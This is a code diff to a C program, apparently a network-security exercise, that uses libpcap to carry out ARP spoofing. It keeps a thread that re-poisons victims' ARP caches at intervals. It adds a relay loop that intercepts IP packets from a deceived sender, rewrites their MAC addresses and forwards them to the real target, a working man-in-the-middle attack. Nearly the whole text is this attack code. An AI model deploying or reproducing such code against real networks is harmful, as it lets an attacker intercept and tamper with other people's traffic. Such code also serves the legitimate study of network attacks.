@@ -12,8 +12,11 @@ int main(int argc, char *argv[]){
 	struct macAddr myMAC, *tSenderMAC, *tTargetMAC;
 	struct pcap_pkthdr *header;
 	const u_char *rcvdPacket;
+	uint8_t *tPacket;
 	int result;
+	int packetSize;
 	struct ether_header *etherHDR;
+	struct iphdr *ipHDR;
 	struct arphdr *arpHDR;
 	pthread_t tid;
 
@@ -56,8 +59,6 @@ int main(int argc, char *argv[]){
 		resolveMAC( &(newArg->senderMAC), &(newArg->myMAC), &(newArg->senderIP), &(newArg->myIP), handle );
 		resolveMAC( &(newArg->targetMAC), &(newArg->myMAC), &(newArg->targetIP), &(newArg->myIP), handle );
 
-		infectARP( &(newArg->senderMAC), &(newArg->senderIP), &(newArg->myMAC), &(newArg->targetIP), handle );
-
 		for( tmpArg = head; tmpArg != NULL && tmpArg->next != NULL; tmpArg = tmpArg->next);
 
 		if( tmpArg == NULL ){
@@ -67,16 +68,35 @@ int main(int argc, char *argv[]){
 			tmpArg->next = newArg;
 		}
 	}
-
+	
 	pthread_create(&tid, NULL, &intervalInfect, (void*)head);
-
 	
 	while(1){
 		result = pcap_next_ex( handle, &header, &rcvdPacket );
-		tmpArg = head;
+		
 		etherHDR = (struct ether_header *)rcvdPacket;
 		if( etherHDR->ether_type == htons(ETHERTYPE_IP) ){
 			/// FIND CORRESPONDING TARGET AND RELAY
+			packetSize = header->caplen;
+			tPacket = (uint8_t *)malloc(packetSize);
+			memcpy(tPacket, rcvdPacket, packetSize);
+
+			etherHDR = (struct ether_header *)tPacket;
+			ipHDR = (struct iphdr*)((uint8_t*)etherHDR + 14);
+
+			tmpArg = head;
+			while(tmpArg){
+				if(!memcmp(&etherHDR->ether_shost, &tmpArg->senderMAC, sizeof(struct macAddr)) && !memcmp(&etherHDR->ether_dhost, &tmpArg->myMAC, sizeof(struct macAddr))){
+					memcpy(&etherHDR->ether_shost, &tmpArg->myMAC, sizeof(struct macAddr));
+					memcpy(&etherHDR->ether_dhost, &tmpArg->targetMAC, sizeof(struct macAddr));
+
+					if( pcap_sendpacket( tmpArg->handle, tPacket, packetSize ) ){
+						exit(1);
+					}
+					break;
+				}
+				tmpArg = tmpArg->next;
+			}
 		}
 		else if( etherHDR->ether_type == htons(ETHERTYPE_ARP) ){
 			/// CHECK IF ARP WILL RECOVER AND INFECT AGAIN
